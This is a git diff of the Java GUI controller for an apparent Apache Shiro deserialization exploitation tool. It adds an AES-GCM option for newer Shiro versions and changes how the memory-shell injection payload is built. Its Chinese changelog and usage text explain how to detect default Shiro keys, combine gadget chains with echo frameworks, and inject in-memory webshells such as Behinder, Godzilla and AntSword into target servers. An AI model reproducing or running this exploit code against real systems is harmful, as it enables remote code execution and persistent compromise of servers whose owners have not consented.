@@ -1,27 +1,6 @@
 package vulgui;
 
-import com.arronlong.httpclientutil.HttpClientUtil;
-import com.arronlong.httpclientutil.common.HttpConfig;
-import com.arronlong.httpclientutil.common.HttpHeader;
-import com.arronlong.httpclientutil.common.HttpResult;
 import org.apache.commons.lang.StringUtils;
-import org.apache.http.Header;
-import org.apache.http.HttpEntity;
-import org.apache.http.NameValuePair;
-import org.apache.http.client.ClientProtocolException;
-import org.apache.http.client.entity.UrlEncodedFormEntity;
-import org.apache.http.client.methods.CloseableHttpResponse;
-import org.apache.http.client.methods.HttpPost;
-import org.apache.http.config.Registry;
-import org.apache.http.config.RegistryBuilder;
-import org.apache.http.conn.socket.ConnectionSocketFactory;
-import org.apache.http.conn.socket.PlainConnectionSocketFactory;
-import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
-import org.apache.http.impl.client.CloseableHttpClient;
-import org.apache.http.impl.client.HttpClients;
-import org.apache.http.impl.conn.PoolingHttpClientConnectionManager;
-import org.apache.http.message.BasicNameValuePair;
-import org.apache.http.util.EntityUtils;
 import vulgui.deser.frame.FramePayload;
 import vulgui.deser.plugins.servlet.MemBytes;
 import vulgui.deser.util.Gadgets;
@@ -33,22 +12,12 @@ import javafx.beans.value.ObservableValue;
 import javafx.fxml.FXML;
 import javafx.scene.control.*;
 import javafx.event.ActionEvent;
-import javafx.scene.input.MouseEvent;
-
-import javax.net.ssl.SSLContext;
-import javax.net.ssl.TrustManager;
-import javax.net.ssl.X509TrustManager;
 import java.io.*;
 import java.net.URL;
-import java.security.KeyManagementException;
-import java.security.NoSuchAlgorithmException;
-import java.security.cert.CertificateException;
-import java.sql.SQLException;
 import java.util.*;
 
 
 public class VulController {
-
     private PrintStream printStream;
 
     @FXML
@@ -91,6 +60,9 @@ public class VulController {
     @FXML
     private CheckBox allshirokey;
 
+    @FXML
+    private CheckBox aesgcm;
+
     private static String shiroRememberme = null;
 
     @FXML
@@ -105,6 +77,10 @@ public class VulController {
     @FXML
     private TextField targeturl;
 
+    public Tab updateLog;
+
+    @FXML
+    private TextArea updateText;
 
     public static int TimeOut(TextField timevalue) {
         return Integer.parseInt(timevalue.getText()) * 1000;
@@ -118,23 +94,36 @@ public class VulController {
         printStream = new PrintStream(new Console(resultoutput));
         System.setOut(printStream);
         System.setErr(printStream);
-        resultoutput.appendText("版本 v1.3\n");
-        resultoutput.appendText("2020.11.7 更新:\n");
-        resultoutput.appendText("1. 判断密钥使用默认对象通过deleteMe返回判断,发送数据包小且准（参考xray）\n");
-        resultoutput.appendText("2. 优化高版本JDK base64库不一致导致执行失败\n");
 
-        resultoutput.appendText("-------------------------------------------------\n");
-        resultoutput.appendText("使用方法：\n");
-        resultoutput.appendText("勾选批量密钥/自定义密钥 -> 探测默认密钥 -> 选择adget和回显框架 -> 执行\n");
-        resultoutput.appendText("常见组合:\n");
+        updateText.appendText("2020.11.7 更新:\n");
+        updateText.appendText("1. 判断密钥使用默认对象通过deleteMe返回判断,发送数据包小且准（参考xray）。\n");
+        updateText.appendText("2. 优化高版本JDK base64库不一致导致执行失败。\n\n");
+
+        updateText.appendText("2020.11.8 更新:\n");
+        updateText.appendText("1. 高低版本base64库不一致,目前使用org.apache.shiro.codec.Base64避免此问题。\n\n");
+
+        updateText.appendText("2020.11.10:\n");
+        updateText.appendText("1. 修复注入内存马都显示注入成功的错误。\n\n");
+
+        updateText.appendText("2020.11.23:\n");
+        updateText.appendText("1. 忽略https证书错误。\n\n");
+
+        updateText.appendText("2020.12.07:\n");
+        updateText.appendText("1. 添加AES-GCM加密选项（shiro > 1.4.2 默认加密方式）\n");
+        updateText.appendText("2. 修改注入内存马加载默认使用javassist避免jdk版本问题无法注入\n\n");
+
+
+        resultoutput.appendText("使用方法：\n\n");
+        resultoutput.appendText("勾选批量密钥/自定义密钥 -> 探测默认密钥 -> 选择gadget和回显框架 -> 执行\n");
+        resultoutput.appendText("常见组合:\n\n");
         resultoutput.appendText("CommonsCollectionsK1 + TomcatEcho (xray)\n");
         resultoutput.appendText("CommonsBeanutils1 + TomcatEcho/SpringEcho\n");
-        resultoutput.appendText("CommonsCollections2 + TomcatEcho (官方演示环境)\n");
-
+        resultoutput.appendText("CommonsCollections2 + TomcatEcho (官方演示环境)\n\n");
         resultoutput.appendText("更换目标需要清除缓存，程序找到key后会将rememberMe字段写入缓存\n");
+
         resultoutput.appendText("-------------------------------------------------\n");
         resultoutput.appendText("注入内存马相关注意\n");
-        resultoutput.appendText("由于冰蝎/哥斯拉,需要获取PageContext对象而spring环境不能直接获取所以，故纯spring环境请注入蚁剑\n");
+        resultoutput.appendText("由于冰蝎/哥斯拉,需要获取PageContext对象而spring环境不能直接获取所以纯spring环境请注入蚁剑\n");
         resultoutput.appendText("如遇到路径302跳转/404等错误,请自行寻找网站资源目录注入成功率更高或更换注入马\n");
 
         // 控件shiro密钥只在下拉框框架为shiro时候可输入
@@ -310,6 +299,13 @@ public class VulController {
             } else {
                 resultoutput.setText("发现rememberMe字段,正在测试\n");
 
+                // aes cbc和gcm选择
+                if(aesgcm.isSelected()){
+                    DserUtil.aesCipherType = 1;
+                }else{
+                    DserUtil.aesCipherType = 0;
+                }
+
                 // 初始化构造连生成对象
                 DserUtil.init_gen(gadgetOption, framename);
 
@@ -401,7 +397,7 @@ public class VulController {
 //            DserUtil.init_gen(gadgetOption, framename);
 //        }
         // 将injectMem注入工具类 封装到构造链中执行
-        Object template = Gadgetsplugin.createTemplatesImpl("InjectMemTool");
+        Object template = Gadgets.createTemplatesImpl("InjectMemTool");
         Object chainObject = DserUtil.gadgetpayload.getObject(template);
         String rememberMe = DserUtil.genpayload.sendpayload(chainObject, key);
 
